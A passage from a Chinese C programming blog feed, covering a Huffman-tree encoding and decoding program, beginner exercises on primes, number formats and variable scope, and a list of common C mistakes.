class="built_in">min</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构建哈夫曼树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createHuffmanTree</span><span class="params">(HuffmanTree ht,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=n+<span class="number">1</span>;i&lt;=(<span class="number">2</span>*n<span class="number">-1</span>);i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> s1=select(ht,i<span class="number">-1</span>);<span class="comment">//这里i-1</span></span><br><span class="line">		<span class="keyword">int</span> s2=select(ht,i<span class="number">-1</span>);</span><br><span class="line">		ht[i].weight = ht[s1].weight+ht[s2].weight;</span><br><span class="line">		ht[s1].parent=i;</span><br><span class="line">		ht[s2].parent=i;</span><br><span class="line">		ht[i].Lchild=s1;</span><br><span class="line">		ht[i].Rchild=s2;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得编码（从下往上反向）</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetCode</span><span class="params">(<span class="keyword">int</span> A[],HuffmanTree ht, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> length=<span class="number">0</span>,i,j,<span class="built_in">get</span>;</span><br><span class="line">	<span class="keyword">char</span> s[<span class="number">100</span>]; <span class="comment">//定义要输入字符的空间</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"（#提示——输入示例bbbaddeccbbb）输入要编码的字符：\n"</span>);</span><br><span class="line">	getchar();<span class="comment">//清除换行符</span></span><br><span class="line">	gets(s);</span><br><span class="line">	<span class="keyword">int</span> m=<span class="built_in">strlen</span>(s);</span><br><span class="line">	<span class="keyword">for</span>(i=m<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)<span class="comment">//从后往前处理字符</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(s[i]==ht[j].data)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">get</span> = j;  <span class="comment">//获取最后一个字符的flag也就是位置</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span>(ht[<span class="built_in">get</span>].parent) </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(ht[ht[<span class="built_in">get</span>].parent].Lchild==<span class="built_in">get</span>) <span class="comment">//判断父节点的左孩子是否等于我们找的get那个位置</span></span><br><span class="line">			&#123;</span><br><span class="line">				A[length]=<span class="number">0</span>; <span class="comment">//左孩子是0</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				A[length]=<span class="number">1</span>; <span class="comment">//右孩子是1</span></span><br><span class="line">			&#125;</span><br><span class="line">			length++;</span><br><span class="line">			<span class="built_in">get</span>=ht[<span class="built_in">get</span>].parent;<span class="comment">//再把父节点给get 直到父节点为0 就编码成功</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> length<span class="number">-1</span>;  <span class="comment">//最后会多+1，所以减去一个1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印编码</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printCode</span><span class="params">(<span class="keyword">int</span> A[], <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=length; i&gt;=<span class="number">0</span>; i--)<span class="comment">//从后向前输出即为编码结果</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d"</span>,A[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解码</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetreCode</span><span class="params">(<span class="keyword">int</span> A[], <span class="keyword">char</span> B[], HuffmanTree ht, <span class="keyword">int</span> length1, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,length2=<span class="number">0</span>,cur=<span class="number">2</span>*n<span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=length1;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(A[i])<span class="comment">//A[i]只可能为1或者0，提示：0是左孩子，1是右孩子</span></span><br><span class="line">		&#123;</span><br><span class="line">			cur=ht[cur].Rchild;<span class="comment">//根结点的右孩子赋值给cur</span></span><br><span class="line">			<span class="keyword">if</span>(ht[cur].Rchild==<span class="number">0</span>)<span class="comment">//该结点的右孩子如果是0就说明是叶子节点，提示：二叉树只有0和2</span></span><br><span class="line">			&#123;</span><br><span class="line">				B[length2]=ht[cur].data;</span><br><span class="line">				length2++;</span><br><span class="line">				cur=<span class="number">2</span>*n<span class="number">-1</span>;<span class="comment">//回到根节点</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			cur=ht[cur].Lchild;<span class="comment">//和上面一样就不说了</span></span><br><span class="line">			<span class="keyword">if</span>(ht[cur].Lchild==<span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				B[length2]=ht[cur].data;</span><br><span class="line">				length2++;</span><br><span class="line">				cur=<span class="number">2</span>*n<span class="number">-1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> length2<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解码打印</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printreCode</span><span class="params">(<span class="keyword">char</span> B[],<span class="keyword">int</span> length2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=length2;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%c"</span>,B[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印哈夫曼树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printHuffmanTree</span><span class="params">(HuffmanTree ht, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"结点\tweigt\tdata\tLchild\tRchild\tparent\n"</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\t%d\t%c\t%d\t%d\t%d\n"</span>,i,ht[i].weight,ht[i].data,ht[i].Lchild,ht[i].Rchild,ht[i].parent);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HuffmanTree ht; </span><br><span class="line">	<span class="keyword">int</span> n; <span class="comment">//n为所需的结点数</span></span><br><span class="line">	<span class="keyword">int</span> A[<span class="number">100</span>];<span class="comment">//存储编码</span></span><br><span class="line">	<span class="keyword">char</span> B[<span class="number">100</span>];<span class="comment">//存储输出的字符串</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"#提示——（输入示例 5）请输入叶子节点个数:\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">	InitHuffmanTree(ht,n); <span class="comment">//初始化</span></span><br><span class="line">	createHuffmanTree(ht,n); <span class="comment">//构建哈弗曼树</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> length = GetCode(A,ht,n);</span><br><span class="line">	printCode(A,length);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> length2 = GetreCode(A,B,ht,length,n);</span><br><span class="line">	printreCode(B,length2);</span><br><span class="line"></span><br><span class="line">	printHuffmanTree(ht,n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
        <tag>成长之路</tag>
      </tags>
  </entry>
  <entry>
    <title>[C语言]学习之路</title>
    <url>/2021/05/21/%5BC%E8%AF%AD%E8%A8%80%5D%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="实例：C语言编程题"><a href="#实例：C语言编程题" class="headerlink" title="实例：C语言编程题"></a>实例：C语言编程题</h1><blockquote>
<p>求100到300之间所有素数</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">100</span>;i &lt;= <span class="number">300</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j = <span class="number">2</span>; j &lt;= i; j++)</span><br><span class="line">			<span class="keyword">if</span>(i%j == <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">if</span>(j == i)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"%-4d"</span>,i);  <span class="comment">//-4d是左对齐</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="预备计算机知识"><a href="#预备计算机知识" class="headerlink" title="预备计算机知识"></a>预备计算机知识</h1><blockquote>
<p>汇编语言是最低级的语言，它可以直接与硬件打交道。高级语言有Pascal、Basic、Fortran等等。高级语言的一条语句对应低级语言的很多条语句，任何高级语言编写的程序都要经过编译程序的编译、连接才能成为可以运行的程序。<br>　　编译连接的过程也就是把高级语言翻译成机器语言(二进制机器码)的过程，而汇编语言是基本上与机器语言一 　　一对应的一种语言。这个翻译过程是由编译程序自动完成的。把C语言定为中级语言是有它的道理的，因为C语言既有汇编语言的存取底层硬件的能力，又具有高级语言的许多特点。熟练掌握了C语言，学习其它的各种编程语言应该是很轻松的了。<br>　　<br>　　C语言的书写格式：<br>　　1) 一个C语言编写的源程序，必定有一个主程序(称为main()函数，在C语言中子程序称为“函数”(当然，不要理解成为数学里面的“函数”)。但是决不能有一个以上的main函数(即只能有一个)。<br>　　2) 函数语句块用‘{’括号开始， 以‘}’反括号结束。这样的花括号必须成对出现。<br>　　3) 表达式写在小括号里面，以‘(’括号开始，以‘)’反括号结束。<br>　　4) 函数不能嵌套，即函数里面不能再套函数。(每一个函数是完成一个特定功能的函数模块)<br>　　<br>　　C语言的组成：<br>　　 C语言是由许多函数组成的。其中只有一个主函数(main()函数)。C程序执行时总是从main函数的‘{’处开始，至main函数的反大括号’}’处结束。当然还有其它一些规则，这将在以后的学习中去熟悉它。<br>　　<br>　　C语言的书写规则：<br>　　 C语言在书写时有它自身的特点：书写格式比较自由，在一行里可以写多条语句，一个语句也可以分写在多行上。虽然如此，在书写源程序时还是要注意哪些可以自由书写，而哪些必须要按照书写规则来书写。<br>　　几条规则写在下面：<br>　　1) 一行内可以写几个语句，建议一行不超过两条语句；<br>　　2) 一条语句可以写在多行上；<br>　　3) C语句不需要写行标号；<br>　　4) 每条语句及数据定义的后面要写上分号以表示该语句结束；<br>　　5) C语言中注释用 //来表示；<br>　　6) 建议书写时采用缩进格式；<br>　　7) 花括号、小括号都是成对出现的。<br>　　<br>　　一个最简单的C程序的编写：<br>　 　/程序代码/ /注释部分/<br>　　 main() /main是主函数名。紧跟在main后面的括号是放参数的。<br>　　 括号里面为空说明main函数不需要参数/<br>　　{ /正写的大花括号表示main函数从这里开始/<br>　　<br>　　} /反写的大花括号表示main函数到这里结束/<br>　　<br>　　说明：由于是一个演示程序，在函数体内并没有任何可以执行的语句，也就是这个程序什么事也不做。<br>　　这个程序就是这么简单： 写在一行上就是 main() { }<br>　　你在TC的编辑环境下把这段代码输入进去，按F9键编译连接，按CTRL_F5运行，一定很正常。但是什么结果也不会有，因为在main函数里面什么代码也没有。<br>　　<br>　　下面再举一个可以向屏幕上输出一条信息的例子：<br>　　main()<br>　　{<br>　　 printf(“这就是C语言编写的程序!”); /这一条语句的作用是向屏幕输出一条信息<br>　　 ”这就是C语言编写的程序!”/<br>　　}<br>　　在这个程序中，main函数只有一条语句：printf(“这就是C语言编写的程序!”);这个语句的作用是向屏幕输出一个字符串。有关这个语句的知识以后再讲。现在要注意的是一个C语言程序的框架是怎样组成的。<br>　　<br>　　C语言程序的几种文件格式：<br>　　 1、 源程序—在TC集成环境中输入的程序文本称为源程序。源程序是一种文本文件。它是我们看得见并认识的一种文件。其扩展名为.C。例如你把文件保存为TEST，那么在磁盘上应看得到TEST.C这个文件。这样的文件可以用记事本打开。<br>　　 2、二进制文件—写完了源程序后接着要做的是编译这个文件。在TC集成环境里是按ALT_F9键，编译后生成了一个二进制文件，这个二进制文件名为TEST.OBJ，也就是扩展名为OBJ的目标文件。<br>　　 3、运行文件—最后一步是make(或Link)，在TC集成环境里是按F9键Make之后生成了一个可以在DOS下运行的文件，其扩展名为EXE。如TEST.EXE。这个EXE文件是由第2步中的OBJ文件生成的。<br>　　OBJ文件虽然是二进制文件，而电脑又是可以运行二进制文件的，为什么还要把OBJ文件Link为EXE文件才能运行？这里的知识就比较多了，这里不能多讲。<br>　　但是要明白一点，在DOS下仅仅有了一个二进制文件还不能运行，因为操作系统要把这些二进制文件加以规划，把相应的数据、程序代码放到应该放的内存位置，这样的经过严密规划和组织好了的二进制文件才能运行。而这些只有在生成的EXE文件里面才做完了这些工作。</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">015</span>; <span class="comment">//0开头的是八进制</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,i);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>输出结果13</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">47</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>,x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%X\n"</span>,x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%#X\n"</span>,x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%#x\n"</span>,x);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>输出结果</p>
<p>2f<br>2F<br>0X2F<br>0x2f</p>
</blockquote>
<blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">%a,%A 读入一个浮点值(仅C99有效)  </span><br><span class="line">　　%c 读入一个字符  </span><br><span class="line">　　%d 读入十进制整数  </span><br><span class="line">　　%i 读入十进制，八进制，十六进制整数  </span><br><span class="line">　　%o 读入八进制整数  </span><br><span class="line">　　%x,%X 读入十六进制整数  </span><br><span class="line">　　%s 读入一个字符串，遇空格、制表符或换行符结束。  </span><br><span class="line">　　%f,%F,%e,%E,%g,%G 用来输入实数，可以用小数形式或指数形式输入。  </span><br><span class="line">　　%p 读入一个指针  </span><br><span class="line">　　%u 读入一个无符号十进制整数  </span><br><span class="line">　　%n 至此已读入值的等价字符数  </span><br><span class="line">　　%[] 扫描字符集合  </span><br><span class="line">　　%% 读%符号  </span><br><span class="line">　　x是1~f，X是1~F</span><br><span class="line">　　#是带格式输出 例如0x代表十六进制</span><br></pre></td></tr></table></figure></div>
</blockquote>
<h1 id="C语言常见误区"><a href="#C语言常见误区" class="headerlink" title="C语言常见误区"></a>C语言常见误区</h1><blockquote>
<p>　1.书写标识符时，忽略了大小写字母的区别。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">main() </span><br><span class="line">&#123; </span><br><span class="line">int a&#x3D;5; </span><br><span class="line">printf(&quot;%d&quot;,A); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>　　编译程序把a和A认为是两个不同的变量名，而显示出错信息。C认为大写字母和小写字母是两个不同的字符。习惯上，符号常量名用大写，变量名用小写表示，以增加可读性。<br>　　2.忽略了变量的类型，进行了不合法的运算。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">main() </span><br><span class="line">&#123; </span><br><span class="line">float a,b; </span><br><span class="line">printf(&quot;%d&quot;,a%b); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>　　%是求余运算，得到a/b的整余数。整型变量a和b可以进行求余运算，而实型变量不允许进行“求余”运算。<br>　　3.将字符常量与字符串常量混淆。<br>　　char c;<br>　　c=”a”;<br>　　在这里就混淆了字符常量与字符串常量，字符常量是由一对单引号括起来的单个字符，字符串常量是一对双引号括起来的字符序列。C规定以“\”作字符串结束标志，它是由系统自动加上的，所以字符串“a”实际上包含两个字符：‘a’和‘&#39;，而把它赋给一个字符变量是不行的。<br>　　4.忽略了“=”与“==”的区别。<br>　　在许多高级语言中，用“=”符号作为关系运算符“等于”。如在BASIC程序中可以写if (a=3) then …但C语言中，“=”是赋值运算符，“==”是关系运算符。如：<br>　　if (a==3) a=b;前者是进行比较，a是否和3相等，后者表示如果a和3相等，把b值赋给a。由于习惯问题，初学者往往会犯这样的错误。<br>　　5.忘记加分号。<br>　　6.多加分号。<br>　　7.输入变量时忘记加地址运算符“&amp;”。<br>　　int a,b;<br>　　scanf(“%d%d”,a,b);<br>　　这是不合法的。Scanf函数的作用是：按照a、b在内存的地址将a、b的值存进去。“&amp;a”指a在内存中的地址。<br>　　8.输入数据的方式与要求不符。<br>　　①scanf(“%d%d”,&amp;a,&amp;b);输入时，不能用逗号作两个数据间的分隔符，如下面输入不合法：3，4输入数据时，在两个数据之间以一个或多个空格间隔，也可用回车键，跳格键tab。<br>　　②scanf(“%d,%d”,&amp;a,&amp;b);C规定：如果在“格式控制”字符串中除了格式说明以外还有其它字符，则在输入数据时应输入与这些字符相同的字符。下面输入是合法的：<br>　　3，4此时不用逗号而用空格或其它字符是不对的。<br>　　3 4 3：4<br>　　又如：scanf(“a=%d,b=%d”,&amp;a,&amp;b);输入应如以下形式：a=3,b=4<br>　　9.输入字符的格式与要求不一致。<br>　　在用“%c”格式输入字符时，“空格字符”和“转义字符”都作为有效字符输入。<br>　　scanf(“%c%c%c”,&amp;c1,&amp;c2,&amp;c3);如输入a b c字符“a”送给c1，字符“ ”送给c2，字符“b”送给c3，因为%c只要求读入一个字符，后面不需要用空格作为两个字符的间隔。<br>　　10.输入输出的数据类型与所用格式说明符不一致。<br>　　例如，a已定义为整型，b定义为实型，a=3;b=4.5;printf(“%f%d\n”,a,b);编译时不给出出错信息，但运行结果将与原意不符。这种错误尤其需要注意。<br>　　11.输入数据时，企图规定精度。scanf(“%7.2f”,&amp;a);这样做是不合法的，输入数据时不能规定精度。<br>　　12.switch语句中漏写break语句。<br>　　例如：根据考试成绩的等级打印出百分制数段。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">switch(grade)</span><br><span class="line">&#123; case &#39;A&#39;:printf(&quot;85~100\n&quot;);</span><br><span class="line">  case &#39;B&#39;:printf(&quot;70~84\n&quot;);</span><br><span class="line">  case &#39;C&#39;:printf(&quot;60~69\n&quot;);</span><br><span class="line">  case &#39;D&#39;:printf(&quot;&lt;60\n&quot;);</span><br><span class="line">  default:printf(&quot;error\n&quot;);</span><br></pre></td></tr></table></figure></div>

<p>　　由于漏写了break语句，case只起标号的作用，而不起判断作用。因此，当grade值为A时，printf函数在执行完第一个语句后接着执行第二、三、四、五个printf函数语句。正确写法应在每个分支后再加上“break;”。例如case ‘A’:printf(“85~100\n”);break;<br>　　13.忽视了while和do-while语句在细节上的区别。因为while循环是先判断后执行，而do-while循环是先执行后判断。<br>　　14.定义数组时误用变量。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">int n;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">int a[n];</span><br></pre></td></tr></table></figure></div>

<p>　　数组名后用方括号括起来的是常量表达式，可以包括常量和符号常量。即C不允许对数组的大小作动态定义。<br>　　15.在定义数组时，将定义的“元素个数”误认为是可使的最大下标值。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">main()</span><br><span class="line">&#123;static int a[10]&#x3D;&#123;1,2,3,4,5,6,7,8,9,10&#125;;</span><br><span class="line">printf(&quot;%d&quot;,a[10]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>　　C语言规定：定义时用a[10]，表示a数组有10个元素。其下标值由0开始，所以数组元素a[10]是不存在的。<br>　　16.在不应加地址运算符&amp;的位置加了地址运算符。scanf(“%s”,&amp;str);C语言编译系统对数组名的处理是：数组名代表该数组的起始地址，且scanf函数中的输入项是字符数组名，不必要再加地址符&amp;。应改为：scanf(“%s”,str);<br>　　17.同时定义了形参和函数中的局部变量。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">int max(x,y)</span><br><span class="line">int x,y,z;</span><br><span class="line">&#123;z&#x3D;x&gt;y?x:y;</span><br><span class="line">return(z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>　　形参应该在函数体外定义，而局部变量应该在函数体内定义。应改为：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">int max(x,y)</span><br><span class="line">int x,y;</span><br><span class="line">&#123;int z;</span><br><span class="line">z&#x3D;x&gt;y?x:y;</span><br><span class="line">return(z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> iNumber1=<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,iNumber1);</span><br><span class="line">	<span class="keyword">if</span>(iNumber1&gt;<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> iNumber1=<span class="number">2</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,iNumber1);</span><br><span class="line">		<span class="keyword">if</span>(iNumber1&gt;<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">int</span> iNumber1=<span class="number">3</span>;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,iNumber1);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,iNumber1);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>1<br>2<br>3<br>2</p>
</blockquote>
<blockquote>
<p>　<strong>1.在主函数main中，定义了第一个整形变量，为其赋值为1，赋值后使用printf函数输出变量。在程序的运行结果中可以看到，此时的iNumber的值为1</strong><br>　<strong>2.使用if语句进行判断，这里使用if语句的目的在于划分出一段语句块。因为位于不同作用域的变量可以使用相同的标示符，所以在if语句块中也定义一个iNumber变量，并为其赋值为2.再次使用printf函数输出变量，观察运行结果，发现第二个输出的值为2.此时值为2的变量在此作用域中就将值为1的变量屏蔽掉。</strong></p>
</blockquote>
<h1 id="IF语句"><a href="#IF语句" class="headerlink" title="IF语句"></a>IF语句</h1><blockquote>
<p> <strong>语法格式为：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">if(表达式)  </span><br><span class="line">　　语句1；  </span><br><span class="line">　　else  </span><br><span class="line">　　语句2；  </span><br><span class="line">　　语句3；</span><br></pre></td></tr></table></figure></div>

<p>　　NS图表示如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">　　             |------------|  </span><br><span class="line">　　             |   表达式   |  </span><br><span class="line">　　             |------|-----|  </span><br><span class="line">　　             |  真  |  假 |  </span><br><span class="line">　　             |------|-----|  </span><br><span class="line">　　             |语句1 |语句2|  </span><br><span class="line">　　             |------------|  </span><br><span class="line">　　             |   语句3    |  </span><br><span class="line">　　             |------------|</span><br></pre></td></tr></table></figure></div>
</blockquote>
<blockquote>
<p>　 <strong>语句解释：对表达式1进行判断，结果为真（非0）时则执行语句1，若为假（为0）则执行语句2，完成执行后退出if并执行if后的语句3。</strong></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>    </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">3</span>,b=<span class="number">2</span>,c=<span class="number">1</span>;     <span class="comment">//输入a,b,c三个数</span></span><br><span class="line">	system(<span class="string">"cls"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[1]: %d, %d, %d\n"</span>, a, b, c);  </span><br><span class="line">	&#123;</span><br><span class="line">			<span class="keyword">int</span> b=<span class="number">5</span>;  </span><br><span class="line">			<span class="keyword">int</span> c=<span class="number">12</span>;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"[2]: %d,%d,%d\n"</span>,a,b,c); </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[3] %d,%d,%d,"</span>,a,b,c); 